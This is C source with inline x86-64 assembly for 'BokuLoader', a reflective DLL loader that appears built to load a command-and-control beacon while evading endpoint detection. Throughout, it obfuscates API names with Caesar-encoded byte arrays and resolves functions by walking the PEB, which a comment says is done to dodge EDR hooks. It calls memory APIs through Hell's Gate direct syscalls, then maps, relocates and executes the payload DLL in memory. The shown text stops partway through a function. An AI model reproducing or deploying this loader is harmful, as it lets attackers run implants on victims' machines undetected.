#define WIN32_LEAN_AND_MEAN
#include <windows.h>

typedef struct Export {
    void *   Directory;
    unsigned int DirectorySize;
    void *   AddressTable;
    void *   NameTable;
    void *   OrdinalTable;
    unsigned int NumberOfNames;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    unsigned int size;
    unsigned int SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    unsigned int NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    unsigned int TextSectionSize;
    Export Export;
}Dll, *PDll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    unsigned int SizeOfSection;
    unsigned int Characteristics;
}Section;

void basicCaesar_Decrypt(int stringLength, unsigned char * string, int chiperDecrementKey);
void *   getDllBase(char *);
void *   getFirstEntry(void);
void *   getNextEntry(void * currentEntry, void * firstEntry);
void *   getDllBaseFromEntry(void * entry);
void    Memcpy(void * destination, void * source, unsigned int num);
void *   getExportDirectory(void * dllAddr);
unsigned long   getExportDirectorySize(void * dllAddr);
void *   getExportAddressTable(void * dllBase, void * dllExportDirectory);
void *   getExportNameTable(void * dllBase, void * dllExportDirectory);
void *   getExportOrdinalTable(void * dllBase, void * dllExportDirectory);
unsigned int getNumberOfNames(void * dllExportDirectory);
void *   getSymbolAddress(void * symbolStr, unsigned long StrSize, void * dllBase, void * AddressTable, void * NameTable, void * OrdinalTable, unsigned int NumberOfNames);
void *   xGetProcAddress(void * symbolStr, PDll dll);
void *   getRdllBase(void *);
void *   getNewExeHeader(void * dllBase);
unsigned int getDllSize(void * newExeHeader);
unsigned int getDllSizeOfHeaders(void * newExeHeader);
void *   getOptionalHeader(void * NewExeHeader);
void *   getSizeOfOptionalHeader(void * NewExeHeader);
void *   add(void * a, void * b);
unsigned int getNumberOfSections(void * newExeHeaderAddr);
void *   getBeaconEntryPoint(void * newRdllAddr, void * OptionalHeaderAddr);
void *   getRip(void);
unsigned int copyWithDelimiter(void * dst, void * src, unsigned int n, CHAR delimiter);

unsigned long findSyscallNumber(void * ntdllApiAddr);
unsigned long HellsGate(unsigned long wSystemCall);
void  HellDescent(void);
unsigned long halosGateDown(void * ntdllApiAddr, unsigned long index);
unsigned long halosGateUp(void * ntdllApiAddr, unsigned long index);
unsigned long getSyscallNumber(void * functionAddress);
unsigned __int64 xstrlen(char* string);
void parseDLL(Dll * dll);

typedef void *  (WINAPI * tLoadLibraryA)  (char *);

typedef LONG32 (NTAPI  * tNtProt)        (void *, void *, void *, unsigned int, void *);
typedef LONG32 (NTAPI  * tNtAlloc)       (void *, void *, unsigned long *, PSIZE_T, unsigned long, unsigned long);
typedef LONG32 (NTAPI  * tNtFree)        (void *, void *, PSIZE_T, unsigned long);

typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned int, void *);

#define NtCurrentProcess() ( (void *)(LONG_PTR) -1 )

#ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) ((LONG32)(Status) >= 0)
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    LONG32 status;
    SIZE_T size;
    void * base;

    // get the current address
    void * BokuLoaderStart = getRip();

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase = getRdllBase(BokuLoaderStart); // search backwards from the start of BokuLoader
    parseDLL(&rdll_src);

    // Get Export Directory and Export Tables for NTDLL.DLL
    // Original String:   nTDlL.Dll // String Length:     9 // Caesar Chiper Key: 513556 // Chiper String:     hX`BX
    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
    basicCaesar_Decrypt(9, s_ntdll, 513556);
    Dll ntdll;
    ntdll.dllBase = getDllBase((char *)s_ntdll);
    parseDLL(&ntdll);

    // Get Export Directory and Export Tables for Kernel32.dll
    // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
    basicCaesar_Decrypt(13, s_k32, 1);
    Dll k32;
    k32.dllBase = getDllBase((char *)s_k32);
    parseDLL(&k32);

    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
    basicCaesar_Decrypt(12, kstr1, 234);
    tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);

    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2,0x00};
    basicCaesar_Decrypt(23, ntstr2, 1337);
    tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);

    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef,0x00};
    basicCaesar_Decrypt(22, ntstr3, 1010101110);
    tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);

    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e,0x00};
    basicCaesar_Decrypt(19, ntstr4, 13013);
    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase = NULL;
    base = NULL;
    size = rdll_src.size;
    HellsGate(getSyscallNumber(pNtAllocateVirtualMemory));
    status = ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
        return NULL;

    rdll_dst.dllBase = base;

    // Deallocate the first memory page (4096/0x1000 bytes)
    base = rdll_dst.dllBase;
    size = 4096;
    //size = rdll_src.SizeOfHeaders;
    HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
    status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
  
    // Save .text section address and size for destination RDLL so we can make it RE later
    int textSectionFlag = FALSE;
    rdll_dst.TextSection = NULL;
    rdll_dst.TextSectionSize = 0;
    unsigned long numberOfSections = rdll_src.NumberOfSections;
    rdll_src.NthSection      = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.RVA)        // RAX OUT
            : "r" (rdll_src.NthSection) // RAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add rax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.PointerToRawData) // RAX OUT
            : "r" (rdll_src.NthSection)       // RAX IN
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            : "=r" (section.SizeOfSection) // RAX OUT
            : "r" (rdll_src.NthSection)    // RAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov rbx, [rax] \n"        // name of the section
                "xor rax, rax \n"
                "mov rdx, 0x747865742e \n" // 0x747865742e == '.text'
                "cmp rbx, rdx \n"
                "jne nottext \n"
                "mov rax, 0x1 \n"
                "nottext: \n"
                : "=r" (textSectionFlag)    // RAX OUT
                : "r" (rdll_src.NthSection) // RAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            if(textSectionFlag == TRUE)
            {
                rdll_dst.TextSection = section.dst_rdll_VA;
                rdll_dst.TextSectionSize = section.SizeOfSection;
            }
        }
        // Copy the section from the source address to the destination for the size of the section
        Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src.NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src.OptionalHeader + 0x78;
    // Get the Address of the Import Directory from the Data Directory
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    char * importName;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n" // RVA of Import Directory
        "add rdx, rbx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg rax, rdx \n"
        : "=r" (ImportDirectory) // RAX OUT
        : "r" (DataDirectory),   // RAX IN
          "r" (rdll_dst.dllBase) // RDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "xor rbx, rbx \n"
        "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ebx, [rdx] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "mov rdx, rbx \n"
        "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),   // RDX OUT
          "=r" (importName)       // RAX OUT
        : "r" (rdll_dst.dllBase), // RAX IN
          "r" (nImportDesc)       // RDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = pLoadLibraryA(importName);
        }
        __asm__(
            "xor rbx, rbx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add rbx, rdx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            "xchg rax, rbx \n"
            : "=r" (LookupTableEntry) // RAX OUT
            : "r" (nImportDesc),      // RAX IN        
              "r" (rdll_dst.dllBase)  // RDX IN
        );
        __asm__(
            "xor rbx, rbx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add rbx, rdx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg rax, rbx \n"
            : "=r" (AddressTableEntry) // RAX OUT
            : "r" (nImportDesc),       // RAX IN
              "r" (rdll_dst.dllBase)   // RDX IN
        );
        __asm__(
            "mov rax, [rax] \n"
            : "=r" (nullCheck)        // RAX OUT
            : "r" (AddressTableEntry) // RAX IN
        );
        while(nullCheck)
        {
            parseDLL(&dll_import);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "xor rdx, rdx \n"   // located in the Export Directory in memory of the module which functions/api's are being imported
                    "add rax, 0x10 \n"  // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/unsigned long)
                    "xchg rax, rdx \n"
                    : "=r" (BaseOrdinal)                // RAX OUT
                    : "r" (dll_import.Export.Directory) // RAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov rax, [rax] \n"  // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    : "=r" (importEntryHint) // RAX OUT
                    : "r" (LookupTableEntry) // RAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex)      // RAX OUT
                    : "r" (importEntryHint), // RAX IN
                      "r" (BaseOrdinal)      // RDX IN
                );
                __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
                    "mov r12, rdx \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(unsigned long)
                    "add rax, r12 \n"   // RVA for our functions address
                    "xor rbx, rbx \n"
                    "mov ebx, [rax] \n" // The RVA for the executable function we are importing
                    "add rcx, rbx \n"   // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx \n"
                    : "=r" (EntryAddress)                  // RAX OUT
                    : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
                      "r" (dll_import.dllBase)             // RCX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)         // RAX OUT
                    : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (rdll_dst.dllBase)   // RDX IN
                );
                // use xGetProcAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                EntryAddress = xGetProcAddress(EntryName, &dll_import);
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX OUT, import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                );
            }
            AddressTableEntry += 0x8;
            if(LookupTableEntry)
                LookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                : "=r" (nullCheck)        // RAX OUT
                : "r" (AddressTableEntry) // RAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "xor rbx, rbx \n"
            "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ebx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
            "mov rax, rbx \n"   // RVA of Name DLL
            "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
            : "=r" (importName),     // RDX OUT
              "=r" (importNameRVA)   // RAX OUT
            : "r" (nImportDesc),     // RAX IN
              "r" (rdll_dst.dllBase) // RDX IN
        );
    }
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add rdx, 0x18 \n"  // OptionalHeader.ImageBase
        "mov rdx, [rdx] \n"
        "sub rax, rdx \n"   // dllBase.ImageBase
        : "=r" (BaseAddressDelta)       // RAX OUT
        : "r" (rdll_dst.dllBase),       // RAX IN
          "r" (rdll_src.OptionalHeader) // RDX IN
    );
    void* RelocDir = rdll_src.OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rdx] \n" // 4 byte unsigned long Virtual Address of the Relocation Directory table
        "add rax, rbx \n"   // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        : "=r" (nextRelocBlock)   // RAX OUT
        : "r" (rdll_dst.dllBase), // RAX IN
          "r" (RelocDir)          // RDX IN
    );
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax+0x4] \n" // 4 byte unsigned long Size of the Relocation Directory table
        "xchg rax, rbx \n"
        : "=r" (RelocDirSize) // RAX OUT
        : "r" (RelocDir)      // RAX IN
    );

    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
    {
        __asm__(
            "xor rbx, rbx \n"
            "mov ebx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            "xchg rax, rbx \n"
            : "=r" (relocBlockSize) // RAX OUT
            : "r" (nextRelocBlock)  // RAX IN
        );
        while(relocBlockSize)
        {
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rdx] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                "add rax, rbx \n"   // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                : "=r" (relocVA)          // RAX OUT
                : "r" (rdll_dst.dllBase), // RAX IN
                  "r" (nextRelocBlock)    // RDX IN
            );
            __asm__(
                "xor rdx, rdx \n"
                "mov rbx, 0x2 \n" // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"       // relocBlockSize/2
                : "=r" (RelocBlockEntries) // RAX OUT
                : "r" (relocBlockSize)     // RAX IN
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor rbx, rbx \n"
                    "mov bx, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rbx \n"
                    "shr rbx, 0x0C \n"  // Check the 4 bit type
                    "cmp bl, 0x0A \n"   // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"  // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"  // the last 12 bits is the offset, the first 4 bits is the type
                    "add rdx, rax \n"   // in memory Virtual Address of our current relocation entry
                    "mov rbx, [rdx] \n" // value of the relocation entry
                    "add rbx, rcx \n"   // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [rdx], rbx \n" // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    : "r" (nextRelocBlockEntry), // RAX IN
                      "r" (relocVA),             // RDX IN
                      "r" (BaseAddressDelta)     // RCX IN
                );
                nextRelocBlockEntry += 0x2;
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                "xchg rax, rbx \n"
                : "=r" (relocBlockSize) // RAX OUT
                : "r" (nextRelocBlock)  // RAX IN
            );
        }
    }

    unsigned int oldprotect = 0;
    base = rdll_dst.TextSection;
    size = rdll_dst.TextSectionSize;
    unsigned int newprotect = PAGE_EXECUTE_READ;
    HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
    status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
    if (!NT_SUCCESS(status))
        return NULL;

    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
    ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

void parseDLL(Dll * dll){
    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
    dll->size                 = getDllSize(dll->NewExeHeader);
    dll->SizeOfHeaders        = getDllSizeOfHeaders(dll->NewExeHeader);
    dll->OptionalHeader       = getOptionalHeader(dll->NewExeHeader);
    dll->SizeOfOptionalHeader = getSizeOfOptionalHeader(dll->NewExeHeader);
    dll->NumberOfSections     = getNumberOfSections(dll->NewExeHeader);
    dll->Export.Directory     = getExportDirectory(dll->dllBase);
    dll->Export.DirectorySize = getExportDirectorySize(dll->dllBase);
    dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
    dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
    dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
    dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
}

void * xGetProcAddress(void * symbolStr, Dll * dll)
{
    char   dll_name[64];
    char   api_name[128];
    unsigned long  api_length, i;
    Dll    ref_dll;
    void * firstEntry;
    void * currentEntry;
    unsigned long  StrSize;

    // if there is no export directory, return NULL
    if (!dll->Export.DirectorySize)
        return NULL;

    __asm__(
        "xor rcx, rcx \n"        // Get the string length for the import function name
        "countLoop: \n"
        "inc cl \n"              // increment the name string length counter
        "xor rbx, rbx \n"
        "cmp bl, [rax] \n"       // are we at the null terminator for the string?
        "je fStrLen \n"
        "inc rax \n"             // move to the next char of the string
        "jmp short countLoop \n"
        "fStrLen: \n"
        "xchg rax, rcx \n"
        : "=r" (StrSize)  // RAX OUT
        : "r" (symbolStr) // RAX IN
    );

    void * address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);

    // if not found, return NULL
    if (!address)
        return NULL;

    // is this a forward reference?
    if ((unsigned long *)address >= (unsigned long *)dll->Export.Directory &&
        (unsigned long *)address <  (unsigned long *)dll->Export.Directory + dll->Export.DirectorySize)
    {
        // copy DLL name
        i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
        i--;
        dll_name[i+1] = 'd';
        dll_name[i+2] = 'l';
        dll_name[i+3] = 'l';
        dll_name[i+4] = 0;

        address += i + 1;

        // copy API name
        i = copyWithDelimiter(api_name, address, sizeof(api_name) - 1, 0);
        i--;
        api_name[i] = 0;
        api_length = i + 1;

        // see if the DLL is already loaded
        ref_dll.dllBase = getDllBase(dll_name);
        if (ref_dll.dllBase)
        {
            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            return xGetProcAddress(api_name, &ref_dll);
        }

        // the DLL was not found by name
        // loop over each loaded DLL until we find the correct one
        firstEntry = getFirstEntry();
        currentEntry = firstEntry;
        do
        {
            ref_dll.dllBase = getDllBaseFromEntry(currentEntry);
            // ignore the original DLL with the reference
            if (ref_dll.dllBase == dll->dllBase)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }

            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
            ref_dll.Export.DirectorySize = getExportDirectorySize(ref_dll.dllBase);
            // make sure it has an export directory
            if (!ref_dll.Export.DirectorySize)
            {
                currentEntry = getNextEntry(currentEntry, firstEntry);
                continue;
            }
            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
            // try to find 'api_name' in this DLL
            address = getSymbolAddress(api_name, api_length, ref_dll.dllBase, ref_dll.Export.AddressTable, ref_dll.Export.NameTable, ref_dll.Export.OrdinalTable, ref_dll.Export.NumberOfNames);
            // found?
            if (address)
                break;
            // try the next DLL
            currentEntry = getNextEntry(currentEntry, firstEntry);
        } while(currentEntry);
    }

    return address;
}

__asm__(
"getRip: \n"
    "mov rax, [rsp] \n"             // get the return address
    "ret \n"

"getRdllBase: \n"
    "xor rbx, rbx \n"
    "mov ebx, 0xB0C0ACDC \n"        // egg
"dec: \n"
    "dec rcx \n"
    "cmp ebx, [rcx] \n"             // check for egg
    "jne dec \n"
    "mov rax, rcx \n"               // copy the position pointer
    "sub rax, 0x4 \n"               // check for second egg. If it's not there then its an error
    "cmp ebx, [rax] \n"             // check for egg
    "jne getRdllBase \n"
    "sub rax, 0x50 \n"              // Return the base address of our reflective DLL
    "ret \n"                        // return initRdllAddr


"getDllBase: \n"
    "push rcx \n" // save our string arg on the top of the stack
    "call xstrlen \n" // RAX will be the strlen
    "sub rax, 0x4 \n" // subtract 4 from our string. Truncates the ".dll" or ".exe"
    "mov r10, rax \n" // save strlen in the r10 reg
    "pop rcx \n" // get our string arg from the top of the stack
    "xor rbx, rbx \n"
    "xor rdi, rdi \n" // Clear RDI
    "xor rsi, rsi \n" // Clear RSI
    "mov rbx, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "mov rbx, [rbx+0x18] \n"        // _PEB_LDR_DATA
    "mov rbx, [rbx+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, rbx \n" // save so we know the end of the modList
  "crawl: \n"
    "mov rdx, [rbx+0x50] \n" // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
    "push rcx \n" // save our string arg on the top of the stack
    "mov rax, r10 \n" // reset our string counter
    "call cmpDllStr \n" // see if our strings match
    "pop rcx \n" // remove string arg from the top of the stack
    "test rax, rax \n" // is cmpDllStr match?
    "je found \n"
    "mov rbx, [rbx] \n"             // InMemoryOrderLinks Next Entry
    "cmp r11, [rbx] \n"             // Are we back at the same entry in the list?
    "je failGetDllBase \n" // if we went through all modules in modList then return 0 to caller of getDllBase 
    "jmp crawl \n"
  "cmpDllStr: \n"
    "mov sil, [rcx] \n" // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
    "mov dil, [rdx] \n" // move the byte in string from the InMemList into the lowest byte of the RDI register
    "or sil, 0x20 \n" // convert to lowercase if uppercase
    "or dil, 0x20 \n" // convert to lowercase if uppercase
    "cmp dil, sil \n"   // cmp character byte in the strings
    "jne failcmpDllStr \n" // if no match then return to the caller of cmpDllStr
    "dec rax \n" // decrement the counter
    "test rax, rax \n" // is counter zero?
    "je matchStr \n" // if we matched the string 
    "add rdx, 0x2 \n" // move the unicode string to the next byte and skip the 0x00
    "inc rcx \n" // move our string to the next char
    "jmp cmpDllStr \n" // compare the next string byte
  "failcmpDllStr: \n"
    "mov rax, 0xFFFF \n" // return 0xFFFF
    "ret \n"
  "matchStr: \n"
    "xor rax, rax \n" // return 0x0 
    "ret \n"
  "failGetDllBase: \n"
    "xor rax, rax \n" // return 0x0 
    "jmp end \n"
  "found: \n"
    "mov rax, [rbx+0x20] \n"        // DllBase Address in process memory
  "end: \n"
    "ret \n" // return to caller


// Clobbers: RAX RCX
"xstrlen:" // Get the string length for the string
    "xchg rax, rcx \n"  // RAX = string address
    "xor rcx, rcx \n"   
    "ctLoop: \n"
    "xor rbx, rbx \n"
    "cmp bl, [rax] \n"  // are we at the null terminator for the string?
    "je fLen \n"
    "inc cl \n"         // increment the name string length counter
    "inc rax \n"        // move to the next char of the string
    "jmp short ctLoop \n"
    "fLen: \n"
    "xchg rax, rcx \n" 
    "ret \n" 

"getExportDirectory: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x88] \n"
    "add rax, r8 \n"
    "ret \n" // return ExportDirectory;
"getExportDirectorySize: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x8c] \n"
    "ret \n" // return ExportDirectory Size;
"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"              // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"             // RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"              // unsigned long AddressOfFunctions; // 0x20 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNames
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "xor rax, rax \n"
